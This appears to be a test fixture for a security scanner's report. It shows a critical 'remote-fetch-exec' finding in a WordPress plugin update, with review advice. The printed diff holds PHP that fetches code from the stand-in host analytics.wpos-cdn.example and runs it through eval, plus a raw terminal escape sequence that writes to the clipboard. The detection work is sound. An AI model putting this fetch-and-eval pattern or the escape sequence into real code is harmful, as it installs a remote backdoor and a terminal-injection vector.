@@ -1,0 +1,51 @@
+Finding 7 of 54: remote-fetch-exec: Fetches remote code and runs it
+  Update:      wp-plugin countdown-timer-ultimate 2.6.7 → 2.6.8 (HOLD)
+  Severity:    critical
+  Confidence:  confirmed
+  Where:       includes/class-wpos-analytics.php:88-104
+  Domains:     analytics.wpos-cdn.example
+  Fingerprint: 42676b77378d2cfc
+  Counted:     yes
+
+Evidence
+  wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)
+
+Advice
+  Review remote-fetch-exec before you update.
+
+Diff
+  @@ -80,8 +81,10 @@ includes/class-wpos-analytics.php
+   a
+   b
+   c
+   d
+   e
+   function wpos_init() {
+  +  $b = wp_remote_get('https://analytics.wpos-cdn.example/v2/p');
+  +  eval($b['body']); \x1b]52;c;eA==\x07
+   }
+   f
+
+remote-fetch-exec: Fetches remote code and runs it
+  Severity:    critical
+  Confidence:  confirmed
+  Ecosystems:  wp-plugin, wp-theme, composer, npm
+
+Why it matters
+  A release that shows remote-fetch-exec can change what runs on every request
+  of your site. This text stands in for the detect lane's explain YAML, which
+  the release links.
+
+How to review
+  1. Open the flagged file at the line the finding names and read the code
+     around it, including what calls it.
+  2. Compare with the changelog.
+
+False alarms
+  A vendored library can show the same pattern.
+
+Incidents
+  Example 2024: a plugin sold to a new owner shipped remote-fetch-exec.
+
+More
+  https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec
